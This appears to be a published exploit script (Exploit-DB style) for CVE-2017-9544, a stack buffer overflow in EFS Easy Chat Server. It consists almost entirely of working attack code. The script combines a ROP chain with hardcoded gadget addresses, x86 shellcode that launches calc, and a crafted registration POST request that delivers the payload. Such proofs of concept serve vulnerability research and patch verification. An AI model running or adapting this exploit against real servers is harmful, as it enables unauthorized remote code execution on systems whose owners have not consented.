# Title: EFS Software Easy Chat Server Remote Code Execution
# Author: Alejandro Parodi
# Date: 2018-08-17
# Vendor Homepage: https://www.echatserver.com
# Software Link: https://www.exploit-db.com/apps/c682138ebbea9af7948a3f142bbd054b-ecssetup.exe
# Version: v2.0 to v3.1 
# Tested on: Windows 7 x86
# CVE: CVE-2017-9544
# References: 
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9544

import struct
import urllib3

ip = "192.168.0.23"

nopsleed  = "B"*58
shellcode =  "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shellcode += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shellcode += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shellcode += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode += "\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shellcode += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode += "\x53\x53\x53\x53\x52\x53\xff\xd7";


# Rop Chain
padding    = "A"*57                        # NOPS
pesp_ret   = struct.pack("<L", 0x10011892) # 0x10011892: Gadget push esp, ret # Pass execution to Stack
padding2   = "A"*28                        # NOPS
add_esp_50 = "\x83\xC4\x50"                # StackPivot Add ESP, 0x50 to go over Stack JUNK
jump_esp   = "\xFF\xE4"                    # Jump to Nopsleed + Shellcode
padding3   = "A"*25                        # NOPS
rop = padding
rop += pesp_ret
rop += padding2
rop += add_esp_50
rop += jump_esp
rop += padding3
rop += "%2D%AE%41%00"     # 0x0041AE2D: Gadget add esp, 0CB8h # Stack Pivot 3256 Bytes (Where the As lives)
rop += "%D0%81%47%00" * 2 # 0x004781D0: .data Address to avoid [pointer] crash
eip = rop

# Crafting Payload
payload =  eip + nopsleed + shellcode

# Crafting Request
uri = "http://"+ip+"/registresult.htm"
headers = {
            "Accept-Language":"en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "1000",
            "Cookie":"Cookie: SESSIONID=31382; UserID=admin; PassWD=admin; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://192.168.0.23/register.ghp"
          }

# The parameters need to stay ordered, if not the Application will do not parse it
post_data = "UserName="+payload+"&Password=pwn&Password1=pwn&Sex=1&Email=pwn%40pwn.com&Icon=0.gif&Resume=pwn&cw=1&RoomID=%3C%21--%24RoomID--\x3E&RepUserName=%3C%21--%24UserName--\x3E&submit1=Register"

# Use Urllib3 instead of python requests to avoid url double encode 
# (pretty interesting, python requests v2 by default url encode all the things that are not a string)
# This exploits is posible only mergin Urlencoded Bytes (Addresses) and Non-Urlencode Bytes (Shellcode and PointerToESP_RET Address)
# By default Python Request does a double encoding of the hex bytes deriving in invalid addresses in the Application Stack
http = urllib3.PoolManager()
http.urlopen('POST', uri, headers=headers, body=post_data)
